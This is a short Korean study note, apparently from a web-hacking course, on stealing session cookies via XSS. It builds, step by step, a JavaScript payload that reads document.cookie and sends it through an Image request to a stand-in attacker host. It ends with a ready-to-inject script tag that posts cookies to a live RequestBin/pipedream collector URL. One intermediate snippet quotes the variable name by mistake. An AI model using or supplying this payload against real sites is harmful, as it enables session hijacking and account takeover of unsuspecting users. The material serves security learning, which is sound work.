# cookie 탈취

### #왜 쿠키를 탈취하는가?

세션ID가 쿠키에 저장된다.&#x20;

쿠키를 탈취하면, 그 사람으로 로그인 할 수 있다. (아이디, 로그인 없이)



### #탈취 방법 (Javascript 사용)

탈취할 도메인에서 <mark style="color:red;">XSS</mark>가 되어야 탈취 가능하다.



document.cookie

> 쿠키 정보를 볼 수 있다.

var cookieData = document.cookie;



공격자 서버로 전송하기&#x20;

(서버에서는 받기만 하기)



var i = new Image() # 이미지태그 생성함.&#x20;

i.src = "http://normaltic.attacker.com/";



```javascript
<img src="http://normaltic.attacker.com/">
```

이미지를 가져오기 위해서 해당 주소로 접속함.



데이터를 보내려면 GET 방식 사용&#x20;

var i = new Image() # 이미지태그 생성함.&#x20;

i.src = "http://normaltic.attacker.com/?cookie=" + "Secret\_data";



Secret\_data 대신에 쿠키값을 보내자!!

```javascript
var cookieData = document.cookie; 
var i = new Image() # 이미지태그 생성함. 
i.src = "http://normaltic.attacker.com/?cookie=" + "cookieData";
```



### #공격자 서버

VPS (가상 사설 서버)&#x20;

&#x20;   virtual private server



무료로 쓸 수 있는 것.&#x20;

https;//public.requestbin.com/r/&#x20;

URL 받을 수 있음.

> 요청이 들어오는 기록을 볼 수 있다.



### #공격 코드

```javascript
<script> 
var cookieData = document.cookie;
var i = new Image();
i.src = "https://en6kidlceif13.x.pipedream.net/?cookie=" + cookieData;
</script>
```

